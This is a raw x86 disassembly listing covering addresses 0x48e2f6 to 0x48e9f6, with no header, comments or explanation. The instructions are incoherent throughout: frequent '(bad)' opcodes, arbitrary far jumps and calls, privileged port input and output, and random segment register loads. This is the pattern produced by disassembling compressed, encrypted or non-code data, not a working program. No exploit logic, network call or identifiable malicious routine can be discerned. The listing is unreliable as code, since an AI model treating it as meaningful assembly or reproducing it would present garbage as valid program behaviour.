  48e2f6:	imul   eax,DWORD PTR [esp+esi*1+0x156f1742],0xffffff84
  48e2fe:	push   edx
  48e2ff:	or     al,0x47
  48e301:	out    dx,eax
  48e302:	inc    edx
  48e303:	lods   al,BYTE PTR ds:[esi]
  48e304:	and    ah,BYTE PTR [eax+0x47]
  48e307:	(bad)  
  48e308:	loopne 0x48e2af
  48e30a:	inc    eax
  48e30b:	scas   al,BYTE PTR es:[edi]
  48e30c:	inc    ebx
  48e30d:	pop    ds
  48e30e:	inc    ecx
  48e30f:	loopne 0x48e359
  48e311:	jo     0x48e382
  48e313:	das    
  48e314:	pop    es
  48e315:	add    DWORD PTR [eax+0x476f6266],esi
  48e31b:	ror    BYTE PTR [edx],0xe8
  48e31e:	imul   edi,DWORD PTR [ebx+0x15874797],0xa
  48e325:	jmp    DWORD PTR [esi]
  48e327:	dec    edi
  48e328:	pop    esp
  48e329:	or     al,0xac
  48e32b:	sbb    DWORD PTR [edi-0x41],ebx
  48e32e:	xor    eax,0x116c3051
  48e333:	out    0xef,eax
  48e335:	inc    edx
  48e336:	inc    DWORD PTR [ecx+eiz*4+0x51]
  48e33a:	(bad)  
  48e33b:	aaa    
  48e33c:	mov    bh,0x8f
  48e33e:	sub    al,0x58
  48e340:	and    BYTE PTR [ebx],al
  48e342:	(bad)
  48e347:	adc    al,0xff
  48e349:	cmp    edi,ecx
  48e34b:	and    DWORD PTR [ecx+0x42],edx
  48e34e:	(bad)  
  48e34f:	out    0x88,eax
  48e351:	mov    BYTE PTR [ecx+0x2c],al
  48e354:	out    dx,eax
  48e355:	pop    ss
  48e356:	(bad)  
  48e357:	jmp    0xb445:0x32a7b192
  48e35e:	or     ecx,edi
  48e360:	push   DWORD PTR [ebx]
  48e362:	test   BYTE PTR [edx-0x70503ac0],ch
  48e368:	mov    ebx,0xc720d6d0
  48e36d:	lahf   
  48e36e:	push   edx
  48e36f:	lahf   
  48e370:	mov    ?,WORD PTR [ebx]
  48e372:	mov    al,0x51
  48e374:	xchg   edi,eax
  48e375:	xor    al,0x4f
  48e377:	push   esp
  48e378:	add    BYTE PTR [edx+0x20],ch
  48e37b:	inc    esp
  48e37c:	(bad)  
  48e37d:	xor    BYTE PTR [edx-0x72],al
  48e380:	mov    BYTE PTR [esi],ah
  48e382:	inc    esi
  48e383:	lods   eax,DWORD PTR ds:[esi]
  48e384:	sub    dh,BYTE PTR [edx+ecx*4-0x6e]
  48e388:	inc    esi
  48e389:	mov    edi,0x75180708
  48e38e:	xchg   edi,eax
  48e38f:	out    0xaa,eax
  48e391:	sub    BYTE PTR [esi+eax*1-0x3736d8e9],ah
  48e398:	pop    ebp
  48e399:	ret    0x30e7
  48e39c:	ss inc edx
  48e39e:	mov    BYTE PTR [edx+esi*1+0x31],cl
  48e3a2:	cmp    BYTE PTR ds:0xcf46b0a3,dl
  48e3a8:	jg     0x48e3ea
  48e3aa:	or     eax,0xa2ff6142
  48e3af:	and    al,0x30
  48e3b1:	call   0xc04b:0x8ac05f67
  48e3b8:	xchg   DWORD PTR [edx],eax
  48e3ba:	lods   al,BYTE PTR ds:[esi]
  48e3bb:	bound  eax,QWORD PTR [ebp+0x72af2fd7]
  48e3c1:	jo     0x48e3c5
  48e3c3:	mov    ds:0x1a433897,eax
  48e3c8:	sub    eax,0xae375e9d
  48e3cd:	dec    eax
  48e3ce:	arpl   WORD PTR [ecx+0x8d477a4],ax
  48e3d4:	lods   eax,DWORD PTR ds:[esi]
  48e3d5:	rol    bh,1
  48e3d7:	pop    DWORD PTR [esi+ebp*1]
  48e3da:	ins    DWORD PTR es:[edi],dx
  48e3db:	add    al,0xdf
  48e3dd:	daa    
  48e3de:	inc    edx
  48e3df:	imul   ecx,DWORD PTR [eax],0xe49f09a1
  48e3e5:	push   cs
  48e3e6:	popa   
  48e3e7:	inc    ebp
  48e3e8:	daa    
  48e3e9:	das    
  48e3ea:	xor    DWORD PTR [edx+0x27],ebx
  48e3ed:	and    DWORD PTR [edi+eiz*2],esp
  48e3f0:	xchg   DWORD PTR [eax],ecx
  48e3f2:	mov    bh,0x10
  48e3f4:	scas   eax,DWORD PTR es:[edi]
  48e3f5:	dec    edi
  48e3f6:	jg     0x48e3c2
  48e3f8:	aam    0xa1
  48e3fa:	push   esi
  48e3fb:	fisttp DWORD PTR [eax+0x31]
  48e3fe:	dec    eax
  48e3ff:	mov    edx,0x41af46d7
  48e404:	imul   esi,DWORD PTR [eax],0x21491718
  48e40a:	mov    cl,0x41
  48e40c:	fbstp  TBYTE PTR [edi]
  48e40e:	popa   
  48e40f:	adc    eax,0x4f27ba2c
  48e414:	jmp    0x9a93:0x6726b070
  48e41b:	loop   0x48e3bd
  48e41d:	test   BYTE PTR [edi-0x5],ch
  48e420:	pop    edi
  48e421:	ins    DWORD PTR es:[edi],dx
  48e422:	test   al,0xd0
  48e424:	pop    edx
  48e425:	scas   eax,DWORD PTR es:[edi]
  48e426:	xlat   BYTE PTR ds:[ebx]
  48e427:	aaa    
  48e428:	pop    edi
  48e429:	pop    eax
  48e42a:	imul   ebp,DWORD PTR [ebp+0x11df0f63],0x8f51ab0c
  48e434:	jg     0x48e489
  48e436:	aam    0x8a
  48e438:	test   BYTE PTR [edi],dl
  48e43a:	daa    
  48e43b:	lods   eax,DWORD PTR ds:[esi]
  48e43c:	adc    eax,0x4f5797ab
  48e441:	mov    ds,WORD PTR [esi]
  48e443:	sahf   
  48e444:	push   edx
  48e445:	cmp    ecx,DWORD PTR [edi-0x35]
  48e448:	mov    BYTE PTR [ecx+eiz*2],ch
  48e44b:	pop    ss
  48e44c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48e44d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48e44e:	cdq    
  48e44f:	cdq    
  48e450:	add    BYTE PTR [esi-0x4ebac8cd],ah
  48e456:	adc    dl,BYTE PTR [eax+0x2]
  48e459:	(bad)  
  48e45a:	fadd   st,st(2)
  48e45c:	loop   0x48e40e
  48e45e:	jg     0x48e414
  48e460:	(bad)  
  48e461:	fimul  WORD PTR [ebp-0x9f07d29]
  48e467:	jmp    0x48e4b6
  48e469:	ins    BYTE PTR es:[edi],dx
  48e46a:	pop    edx
  48e46b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48e46c:	mul    ebx
  48e46e:	xor    ebx,edi
  48e470:	(bad)  
  48e471:	pop    ebx
  48e472:	jecxz  0x48e4c3
  48e474:	pop    es
  48e475:	daa    
  48e476:	cmp    DWORD PTR [esi+0x3d],esp
  48e479:	dec    esp
  48e47a:	cmp    bl,dh
  48e47c:	ss xchg edi,eax
  48e47e:	pop    edi
  48e47f:	je     0x48e48c
  48e481:	pop    ss
  48e482:	fldcw  WORD PTR [edi]
  48e484:	xlat   BYTE PTR ds:[ebx]
  48e485:	push   edi
  48e486:	ret    0xa622
  48e489:	mov    DWORD PTR [edi-0x79],ecx
  48e48c:	mov    BYTE PTR [ebp-0x6e],dh
  48e48f:	jnp    0x637aa765
  48e495:	aas    
  48e496:	inc    esp
  48e497:	ss push esi
  48e499:	or     DWORD PTR [ecx+0x56157f9f],esp
  48e49f:	jno    0x48e4f5
  48e4a1:	dec    edi
  48e4a2:	inc    ebp
  48e4a3:	pop    edi
  48e4a4:	imul   ebp,DWORD PTR [ecx+0x70],0xffffff80
  48e4a8:	shr    bh,0x84
  48e4ab:	inc    ebp
  48e4ac:	ret    0x4fa5
  48e4af:	ficomp DWORD PTR [edi-0x2d1cd32e]
  48e4b5:	outs   dx,DWORD PTR ds:[esi]
  48e4b6:	xchg   esi,eax
  48e4b7:	xchg   DWORD PTR [edx],esp
  48e4b9:	jo     0x48e43f
  48e4bb:	mov    dh,0xaf
  48e4bd:	inc    esi
  48e4be:	and    DWORD PTR [edx+eax*2],edx
  48e4c1:	sub    ecx,edi
  48e4c3:	out    dx,eax
  48e4c4:	sbb    ecx,DWORD PTR [ebp-0x1f]
  48e4c7:	lods   eax,DWORD PTR ds:[esi]
  48e4c8:	(bad)  
  48e4c9:	aaa    
  48e4ca:	outs   dx,DWORD PTR ds:[esi]
  48e4cb:	popa   
  48e4cc:	and    eax,0xef0e16c7
  48e4d1:	ss imul eax,eax,0x3a
  48e4d5:	and    bh,ah
  48e4d7:	dec    edi
  48e4d8:	jbe    0x48e4fd
  48e4da:	push   esi
  48e4db:	xor    BYTE PTR [ebx],0x9f
  48e4de:	outs   dx,DWORD PTR ds:[esi]
  48e4df:	inc    esp
  48e4e0:	scas   eax,DWORD PTR es:[edi]
  48e4e1:	pop    eax
  48e4e2:	nop
  48e4e3:	(bad)  
  48e4e5:	inc    edx
  48e4e6:	daa    
  48e4e7:	scas   eax,DWORD PTR es:[edi]
  48e4e8:	jecxz  0x48e52b
  48e4ea:	xchg   edi,eax
  48e4eb:	ins    DWORD PTR es:[edi],dx
  48e4ec:	fild   DWORD PTR [ebx]
  48e4ee:	into   
  48e4ef:	scas   eax,DWORD PTR es:[edi]
  48e4f0:	mov    dh,0x43
  48e4f2:	sbb    al,0x3c
  48e4f4:	out    0x6b,eax
  48e4f6:	mul    DWORD PTR [edi]
  48e4f8:	mov    DWORD PTR [ebx+0x78],ebx
  48e4fb:	sub    eax,edi
  48e4fd:	ja     0x48e48e
  48e4ff:	lods   eax,DWORD PTR ds:[esi]
  48e500:	loope  0x48e562
  48e502:	inc    ebp
  48e503:	daa    
  48e504:	inc    ebx
  48e505:	pop    ss
  48e506:	push   ecx
  48e507:	add    ch,BYTE PTR [esi-0xe]
  48e50a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48e50b:	xor    eax,0x4c1c81a2
  48e510:	stos   DWORD PTR es:[edi],eax
  48e511:	xlat   BYTE PTR ds:[ebx]
  48e512:	das    
  48e513:	cmp    BYTE PTR [eax-0x149c8977],dl
  48e519:	(bad)  [ebx]
  48e51b:	les    esp,FWORD PTR [edx-0x4a]
  48e51e:	xor    edi,ecx
  48e520:	or     al,0x6e
  48e522:	or     edx,edi
  48e524:	daa    
  48e525:	addr16 push eax
  48e527:	sbb    BYTE PTR [edi+0x1018eb0d],dl
  48e52d:	inc    ecx
  48e52e:	mov    dh,0x1f
  48e530:	(bad)  
  48e531:	out    0xa0,eax
  48e533:	jbe    0x48e53f
  48e535:	pop    ds
  48e536:	mov    ds:0x74562a1f,eax
  48e53b:	imul   eax,edi,0xffffff9e
  48e53e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48e53f:	aaa    
  48e540:	sbb    ecx,DWORD PTR [ebx+0x30f4608]
  48e546:	aaa    
  48e547:	je     0x48e5b9
  48e549:	(bad)  
  48e54a:	aaa    
  48e54b:	pop    edi
  48e54c:	cmp    BYTE PTR [ecx+0x23],ah
  48e54f:	xor    DWORD PTR [eax],ecx
  48e551:	ja     0x48e4de
  48e553:	rcl    BYTE PTR [esi+edx*2],1
  48e556:	dec    edi
  48e557:	xlat   BYTE PTR ds:[ebx]
  48e558:	pop    ds
  48e559:	(bad)  
  48e55a:	fs ins BYTE PTR es:[edi],dx
  48e55c:	scas   eax,DWORD PTR es:[edi]
  48e55d:	xlat   BYTE PTR ds:[ebx]
  48e55e:	scas   eax,DWORD PTR es:[edi]
  48e55f:	xor    dh,BYTE PTR [ebp*4+0x302762e8]
  48e566:	xchg   edi,eax
  48e567:	das    
  48e568:	stos   DWORD PTR es:[edi],eax
  48e569:	xchg   esi,eax
  48e56a:	mov    es,WORD PTR [ecx-0x3f0740f5]
  48e570:	push   cs
  48e571:	adc    ebx,DWORD PTR [edi+0x73]
  48e574:	enter  0xf24a,0x81
  48e578:	xlat   BYTE PTR ds:[ebx]
  48e579:	xor    BYTE PTR [ebp-0x781fcb95],ah
  48e57f:	xchg   edi,eax
  48e580:	pop    edi
  48e581:	test   BYTE PTR [eax],bh
  48e583:	add    al,0xe1
  48e585:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48e586:	dec    edi
  48e587:	rcr    BYTE PTR [edx+0x5f8f1088],cl
  48e58d:	xor    ecx,DWORD PTR [eax-0x20dcba4b]
  48e593:	or     esp,esp
  48e595:	push   0xffffffdb
  48e597:	fisub  DWORD PTR [edi]
  48e599:	pop    ss
  48e59a:	dec    edi
  48e59b:	xor    al,BYTE PTR [ebx+ebp*1]
  48e59e:	xor    dh,BYTE PTR [ecx]
  48e5a0:	xlat   BYTE PTR ds:[ebx]
  48e5a1:	ja     0x48e54e
  48e5a3:	pop    ecx
  48e5a4:	adc    al,BYTE PTR [edx+0x37]
  48e5a7:	xchg   esi,eax
  48e5a8:	test   eax,0xbf674aad
  48e5ad:	ss leave 
  48e5af:	aam    0x16
  48e5b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48e5b2:	out    dx,eax
  48e5b3:	dec    edi
  48e5b4:	xor    eax,0x1a36ae40
  48e5b9:	dec    esi
  48e5ba:	dec    edi
  48e5bb:	xor    al,0xac
  48e5bd:	(bad)  
  48e5be:	(bad)
  48e5c3:	push   edi
  48e5c4:	xor    dl,BYTE PTR ds:0x4f35390f
  48e5ca:	push   cs
  48e5cb:	or     BYTE PTR [esi-0x50bcc71c],cl
  48e5d1:	aaa    
  48e5d2:	test   eax,0x77585560
  48e5d7:	jg     0x48e5f9
  48e5d9:	inc    edi
  48e5da:	jb     0x48e591
  48e5dc:	ss mov edi,0x900e3443
  48e5e2:	mov    ds:0x304f421d,eax
  48e5e7:	inc    ecx
  48e5e8:	push   ebx
  48e5e9:	or     ecx,DWORD PTR ds:0x43bfbfb0
  48e5ef:	inc    eax
  48e5f0:	mov    ?,WORD PTR [esi+0x25]
  48e5f3:	inc    esi
  48e5f4:	dec    edi
  48e5f5:	inc    ebx
  48e5f6:	or     al,0x90
  48e5f8:	and    edi,DWORD PTR [ecx]
  48e5fa:	inc    ebp
  48e5fb:	cmp    BYTE PTR [ebx-0x30d2e51d],al
  48e601:	cmp    bh,cl
  48e603:	xor    dl,dh
  48e605:	mov    cl,0x90
  48e607:	xor    edi,esi
  48e609:	mov    eax,0x3fea6d5c
  48e60e:	xor    DWORD PTR [edi+0x31],esi
  48e611:	xor    edx,DWORD PTR [esi]
  48e613:	push   edx
  48e614:	or     ecx,ebp
  48e616:	call   DWORD PTR [edi+0x29]
  48e619:	loopne 0x48e59b
  48e61b:	shl    DWORD PTR [edi+0x21560735],0xd0
  48e622:	ja     0x48e693
  48e624:	pop    edi
  48e625:	mov    ch,0x29
  48e627:	lods   al,BYTE PTR ds:[esi]
  48e628:	imul   esi,DWORD PTR [edi+0x4d6e74b7],0x43
  48e62f:	xor    DWORD PTR [edi+0x46eb9657],esi
  48e635:	sub    BYTE PTR [eax-0x4fbb40a9],dh
  48e63b:	bound  eax,QWORD PTR [ecx]
  48e63d:	mov    edi,0x92c136a7
  48e642:	retf   
  48e643:	xor    eax,0x67375737
  48e648:	inc    edx
  48e649:	push   cs
  48e64a:	nop
  48e64b:	sub    esi,DWORD PTR [eax+esi*1]
  48e64e:	dec    ebp
  48e64f:	pusha  
  48e650:	(bad)
  48e653:	pop    esp
  48e654:	add    eax,0xc24fd5ab
  48e659:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48e65a:	aaa    
  48e65b:	fisub  DWORD PTR [edx+0x36]
  48e65e:	mov    al,0x27
  48e660:	test   DWORD PTR [esi],0x2fc115c8
  48e666:	ss (bad) 
  48e668:	xlat   BYTE PTR ds:[ebx]
  48e669:	push   0x4ed7070b
  48e66e:	or     esp,esp
  48e670:	bound  edi,QWORD PTR [ebx]
  48e672:	out    dx,eax
  48e673:	das    
  48e674:	xor    eax,0x90c245b1
  48e679:	ss xchg edi,eax
  48e67b:	aas    
  48e67c:	or     BYTE PTR ds:0x4637321c,ch
  48e682:	(bad)  
  48e683:	mov    ah,0x98
  48e685:	inc    ecx
  48e686:	and    al,0x9f
  48e688:	or     ecx,edi
  48e68a:	sbb    ah,BYTE PTR [edi]
  48e68c:	outs   dx,DWORD PTR ds:[esi]
  48e68d:	xchg   edi,eax
  48e68e:	pop    eax
  48e68f:	add    al,0xad
  48e691:	inc    edx
  48e692:	(bad)  
  48e693:	shufps xmm5,XMMWORD PTR [ebp+0x6f7f4235],0x27
  48e69b:	add    ebp,0x63a79734
  48e6a1:	add    eax,0x11ab118c
  48e6a6:	aam    0xc6
  48e6a8:	push   es
  48e6a9:	mov    edi,0xeb1b5407
  48e6ae:	shl    BYTE PTR ds:0xd4068fa7,0x30
  48e6b5:	adc    bl,BYTE PTR [edi-0x7d]
  48e6b8:	ror    BYTE PTR [edx-0x3c],1
  48e6bb:	xchg   DWORD PTR [edi-0x5ec5a3bd],esi
  48e6c1:	xor    ecx,DWORD PTR [edi+0x3a]
  48e6c4:	xchg   DWORD PTR [eax+0x6b],edx
  48e6c7:	mov    ds:0x9468af84,al
  48e6cc:	or     dh,BYTE PTR [edi+eax*4+0xf]
  48e6d0:	inc    ebx
  48e6d1:	adc    DWORD PTR [edx+ecx*1],ebp
  48e6d4:	iret   
  48e6d5:	(bad)  
  48e6d6:	xor    bl,bl
  48e6d8:	or     dl,BYTE PTR [esi]
  48e6da:	add    eax,0x2bbf073f
  48e6df:	lds    ebx,FWORD PTR [eax+0x55]
  48e6e2:	aaa    
  48e6e3:	out    0xc,eax
  48e6e5:	add    al,0xb
  48e6e7:	or     ah,BYTE PTR [edi+0x2f]
  48e6ea:	inc    ebx
  48e6eb:	mov    ds:0x34815c04,eax
  48e6f0:	xchg   edi,eax
  48e6f1:	bound  esp,QWORD PTR [eax]
  48e6f3:	adc    DWORD PTR [eax],0x6dd48587
  48e6f9:	jmp    0x8fd6e35
  48e6fe:	dec    eax
  48e6ff:	pop    ebx
  48e700:	xlat   BYTE PTR ds:[ebx]
  48e701:	add    edx,DWORD PTR [edi+0x420490ad]
  48e707:	retf   
  48e708:	jg     0x48e756
  48e70a:	loop   0x48e749
  48e70c:	lods   al,BYTE PTR ds:[esi]
  48e70d:	dec    edi
  48e70e:	ja     0x48e75f
  48e710:	mov    eax,0x8fd301b6
  48e715:	inc    ebp
  48e716:	push   edi
  48e717:	addr16 aaa 
  48e719:	sub    eax,0xf6b012a
  48e71e:	mov    edi,0xad2eb087
  48e723:	lahf   
  48e724:	out    dx,eax
  48e725:	(bad)  
  48e727:	adc    DWORD PTR cs:[ebx+0x43],eax
  48e72b:	ja     0x48e766
  48e72d:	bound  ebx,QWORD PTR [ecx-0x21]
  48e730:	sub    DWORD PTR [ebx-0x27e8c715],0x30264842
  48e73a:	cmp    BYTE PTR [edx+edx*2],bh
  48e73d:	mov    esp,edi
  48e73f:	pop    ss
  48e740:	mov    ebx,0x6b8d7417
  48e745:	ja     0x48e71e
  48e747:	daa    
  48e748:	xchg   BYTE PTR [ebp-0x26],dl
  48e74b:	pop    edx
  48e74c:	push   edi
  48e74d:	push   edi
  48e74e:	inc    esi
  48e74f:	push   0x2f4fd095
  48e754:	mov    al,0x2a
  48e756:	pusha  
  48e757:	and    al,0x87
  48e759:	ficom  DWORD PTR [esi+0x72]
  48e75c:	and    eax,DWORD PTR [edi-0x566e00d0]
  48e762:	xor    DWORD PTR [ecx],eax
  48e764:	pop    DWORD PTR [edi]
  48e766:	imul   esi,DWORD PTR ds:0x2257588a,0xffffffb8
  48e76d:	test   BYTE PTR [esi-0x9],dh
  48e770:	or     edx,DWORD PTR [edi-0x80]
  48e773:	scas   al,BYTE PTR es:[edi]
  48e774:	call   0x2143:0x8046b750
  48e77b:	(bad)
  48e77e:	sub    cl,BYTE PTR ds:0x87a3586c
  48e784:	out    0xb8,eax
  48e786:	ss push esi
  48e788:	ret    
  48e789:	inc    edi
  48e78a:	pop    ss
  48e78b:	and    BYTE PTR [edx+eax*4],ch
  48e78e:	jmp    0x48e7d7
  48e790:	xor    bh,ch
  48e792:	and    al,BYTE PTR [esi+edx*1-0x3c8828cd]
  48e799:	sub    BYTE PTR [eax-0x2f],bl
  48e79c:	das    
  48e79d:	neg    edi
  48e79f:	pop    ebx
  48e7a0:	test   eax,0xf77e20d2
  48e7a5:	ret    
  48e7a6:	sbb    cl,BYTE PTR [eax+0x3fa7e735]
  48e7ac:	pop    eax
  48e7ad:	in     al,dx
  48e7ae:	xchg   edx,eax
  48e7af:	ret    0x2f6b
  48e7b2:	arpl   WORD PTR [ecx+0x1a],si
  48e7b5:	test   eax,0x90accf1f
  48e7ba:	dec    ebx
  48e7bb:	xchg   BYTE PTR [edi+0x38],al
  48e7be:	inc    ecx
  48e7bf:	mov    al,BYTE PTR ds:0xe7b72c81
  48e7c5:	mov    al,0x2e
  48e7c7:	add    DWORD PTR [edi+0x45],esp
  48e7ca:	ja     0x48e82e
  48e7cc:	jb     0x48e81e
  48e7ce:	hlt    
  48e7cf:	mov    edi,0xb61357f
  48e7d4:	or     eax,0x1fa7a647
  48e7d9:	sub    al,0x4e
  48e7db:	or     BYTE PTR [ebx+0x2c08671f],ah
  48e7e1:	or     BYTE PTR [ebp+0x17],ch
  48e7e4:	mov    al,ds:0xa78115b5
  48e7e9:	outs   dx,DWORD PTR ds:[esi]
  48e7ea:	sbb    BYTE PTR [edx-0x7b],bl
  48e7ed:	or     BYTE PTR [edi],dl
  48e7ef:	push   ss
  48e7f0:	add    al,0x91
  48e7f2:	test   BYTE PTR ds:0x6b25af67,dh
  48e7f8:	xor    esp,DWORD PTR [ebp+0x692955f7]
  48e7fe:	rcl    BYTE PTR [edi-0x61],0xc1
  48e802:	inc    edx
  48e803:	imul   ebp,DWORD PTR [ebp+0x67],0x6f
  48e807:	(bad)  
  48e808:	(bad)  
  48e809:	outs   dx,BYTE PTR ds:[esi]
  48e80a:	sub    eax,0x6a6344e4
  48e80f:	sub    eax,0xd72762d2
  48e814:	lahf   
  48e815:	inc    ebp
  48e816:	cmp    al,BYTE PTR [ebp-0xd98e13f]
  48e81c:	or     al,0x12
  48e81e:	shl    BYTE PTR [eax-0x22498031],cl
  48e824:	sbb    BYTE PTR [ebx-0x45],0xaf
  48e828:	dec    edi
  48e829:	imul   edx,DWORD PTR ds:0x4f838b18,0x25
  48e830:	xor    BYTE PTR [edi+edx*2],ah
  48e833:	das    
  48e834:	xor    DWORD PTR [ebp+0x43],eax
  48e837:	adc    eax,DWORD PTR [esi+0x6]
  48e83a:	xor    esi,DWORD PTR [ecx]
  48e83c:	fld    TBYTE PTR [edx+0x7]
  48e83f:	test   al,0x75
  48e841:	daa    
  48e842:	fild   QWORD PTR [edx]
  48e844:	lock jbe 0x48e831
  48e847:	jg     0x48e850
  48e849:	iret   
  48e84a:	pop    ds
  48e84b:	nop
  48e84c:	cdq    
  48e84d:	push   0xffffffe1
  48e84f:	cmp    DWORD PTR [edi-0x54bcddbe],ebp
  48e855:	enter  0x9fa7,0xb4
  48e859:	test   al,0x4d
  48e85b:	sub    eax,0xa30062a7
  48e860:	arpl   si,ax
  48e862:	fbld   TBYTE PTR [bp+si+0x15]
  48e866:	push   ecx
  48e867:	rol    BYTE PTR [edi+0x5c049b00],0xcb
  48e86e:	(bad)  
  48e86f:	xor    DWORD PTR [esi],edx
  48e871:	popa   
  48e872:	je     0x48e8ab
  48e874:	aaa    
  48e875:	mov    ds:0x610c0ad4,eax
  48e87a:	iret   
  48e87b:	xchg   dl,ah
  48e87d:	push   edx
  48e87e:	pxor   mm7,QWORD PTR [ebx]
  48e881:	pop    ss
  48e882:	xor    ah,BYTE PTR [eax-0x6b]
  48e885:	test   eax,0xd4ab925b
  48e88a:	mov    al,0x5e
  48e88c:	mov    esp,DWORD PTR [edi+0x76]
  48e88f:	xchg   edi,eax
  48e890:	add    BYTE PTR [ecx],cl
  48e892:	and    al,0x4d
  48e894:	xor    ecx,DWORD PTR [ebx-0x70]
  48e897:	call   0x920:0xf73fac01
  48e89e:	sub    esp,DWORD PTR [eax]
  48e8a0:	call   FWORD PTR [edx-0x79]
  48e8a3:	mov    eax,ds:0x816f2fd5
  48e8a8:	xor    eax,0x379feb10
  48e8ad:	aad    0x41
  48e8af:	add    ecx,DWORD PTR [ebx-0x28d9d0f9]
  48e8b5:	jo     0x48e867
  48e8b7:	dec    edi
  48e8b8:	inc    ecx
  48e8b9:	cmovb  edx,DWORD PTR [ebp+0x25]
  48e8bd:	add    eax,0x141f7fb8
  48e8c2:	adc    eax,edx
  48e8c4:	add    BYTE PTR [edi],0x7
  48e8c7:	daa    
  48e8c8:	ror    DWORD PTR ss:[eax],0xef
  48e8cc:	dec    edi
  48e8cd:	jp     0x48e8cf
  48e8cf:	jbe    0x48e933
  48e8d1:	pop    ds
  48e8d2:	daa    
  48e8d3:	mov    BYTE PTR [edx],bl
  48e8d5:	ret    0x46da
  48e8d8:	mov    edi,0xd2098d2e
  48e8dd:	aaa    
  48e8de:	xchg   edi,eax
  48e8df:	mov    ecx,DWORD PTR [ebx+0x23]
  48e8e2:	(bad)  
  48e8e3:	(bad)  
  48e8e4:	push   DWORD PTR [eax+0x7745692e]
  48e8ea:	push   edi
  48e8eb:	rol    BYTE PTR [edx-0x23],1
  48e8ee:	add    cl,BYTE PTR [edi]
  48e8f0:	fist   WORD PTR [ecx+0x40]
  48e8f3:	sub    dl,ah
  48e8f5:	inc    ebp
  48e8f6:	ja     0x48e8d0
  48e8f8:	test   DWORD PTR ds:0x8f77e7ac,esi
  48e8fe:	xor    DWORD PTR [ebp-0x18f8d4fd],ecx
  48e904:	(bad)
  48e908:	pusha  
  48e909:	(bad)  
  48e90a:	xor    bl,BYTE PTR [ebp*1-0x5068eace]
  48e911:	xor    al,0x51
  48e913:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48e914:	es dec edi
  48e916:	(bad)  
  48e917:	xor    eax,0x518ec540
  48e91c:	xchg   DWORD PTR [edi],ebx
  48e91e:	(bad)  
  48e91f:	xchg   esp,eax
  48e920:	and    dh,BYTE PTR [eax+esi*2]
  48e923:	xor    dh,BYTE PTR [edi+0x50c85c9a]
  48e929:	lahf   
  48e92a:	cmp    BYTE PTR [ebp+0x64],al
  48e92d:	and    BYTE PTR [edx+0x4d],0xef
  48e931:	(bad)  
  48e932:	xor    ecx,eax
  48e934:	inc    esp
  48e935:	inc    esp
  48e936:	mov    ecx,DWORD PTR [edi+0x3ac50431]
  48e93c:	push   es
  48e93d:	pop    ds
  48e93e:	ja     0x48e91d
  48e940:	push   edx
  48e941:	mov    al,ds:0xb8777768
  48e946:	push   eax
  48e947:	(bad)  
  48e948:	(bad)  
  48e949:	inc    esp
  48e94a:	outs   dx,DWORD PTR ds:[esi]
  48e94b:	arpl   WORD PTR [eax-0x4468b970],si
  48e951:	(bad)  
  48e952:	xor    eax,0x5602eb59
  48e957:	pop    es
  48e958:	mov    bh,0xb4
  48e95a:	cmp    cl,BYTE PTR [ecx-0x54]
  48e95d:	sysret 
  48e95f:	xor    BYTE PTR [esi+0x4377551c],dl
  48e965:	mov    cl,0x5b
  48e967:	mov    ebx,DWORD PTR [ecx-0x31]
  48e96a:	das    
  48e96b:	and    al,0x5d
  48e96d:	inc    ebp
  48e96e:	nop
  48e96f:	ja     0x48e9b3
  48e971:	mov    BYTE PTR [ebx],al
  48e973:	xchg   edi,eax
  48e974:	cwde   
  48e975:	addr16 das 
  48e977:	(bad)  
  48e978:	ins    DWORD PTR es:[edi],dx
  48e979:	sbb    DWORD PTR [edx-0x59],edx
  48e97c:	pop    es
  48e97d:	xchg   edi,eax
  48e97e:	das    
  48e97f:	adc    cl,dl
  48e981:	inc    esp
  48e982:	add    eax,0x356a39a7
  48e987:	or     edi,DWORD PTR [edx+0x2dc746d7]
  48e98d:	test   al,0x4c
  48e98f:	loope  0x48e978
  48e991:	jg     0x48e93f
  48e993:	adc    eax,edx
  48e995:	or     ah,BYTE PTR [ebx+0x1f]
  48e998:	jecxz  0x48e93c
  48e99a:	mov    DWORD PTR [ebx-0x65],ecx
  48e99d:	stos   DWORD PTR es:[edi],eax
  48e99e:	xchg   ebp,eax
  48e99f:	xchg   edx,eax
  48e9a0:	mov    dh,0x5
  48e9a2:	outs   dx,DWORD PTR ds:[esi]
  48e9a3:	inc    edi
  48e9a4:	adc    edx,DWORD PTR ds:0x33ac1b75
  48e9aa:	es ja  0x48e9d5
  48e9ad:	push   0x34175a9d
  48e9b2:	adc    eax,0xb75fdac2
  48e9b7:	xor    esi,DWORD PTR [ecx]
  48e9b9:	cmc    
  48e9ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48e9bb:	pop    eax
  48e9bc:	(bad)  
  48e9bd:	pop    edi
  48e9be:	inc    ebx
  48e9bf:	scas   eax,DWORD PTR es:[edi]
  48e9c0:	pop    DWORD PTR [eax+0x9]
  48e9c3:	jecxz  0x48ea22
  48e9c5:	inc    ebx
  48e9c6:	add    edi,DWORD PTR [edi+0x724a45a0]
  48e9cc:	inc    ebx
  48e9cd:	daa    
  48e9ce:	pop    eax
  48e9cf:	mov    ds:0x7679716,eax
  48e9d4:	sbb    BYTE PTR [ecx],dh
  48e9d6:	jl     0x48e9fc
  48e9d8:	pop    ebx
  48e9d9:	push   ebx
  48e9da:	xchg   DWORD PTR [eax+0x74],ebp
  48e9dd:	cmp    al,0x64
  48e9df:	xor    eax,DWORD PTR [edi+0x25622587]
  48e9e5:	push   ss
  48e9e6:	xchg   edi,eax
  48e9e7:	dec    edi
  48e9e8:	push   es
  48e9e9:	loopne 0x48ea56
  48e9eb:	lds    esp,FWORD PTR [edi]
  48e9ed:	xlat   BYTE PTR ds:[ebx]
  48e9ee:	inc    edi
  48e9ef:	push   ecx
  48e9f0:	mov    WORD PTR [esi+0x24],es
  48e9f3:	(bad)  
  48e9f4:	pop    ds
  48e9f5:	inc    esi
  48e9f6:	mov    cs,WORD PTR [ebp+0x26e77748]
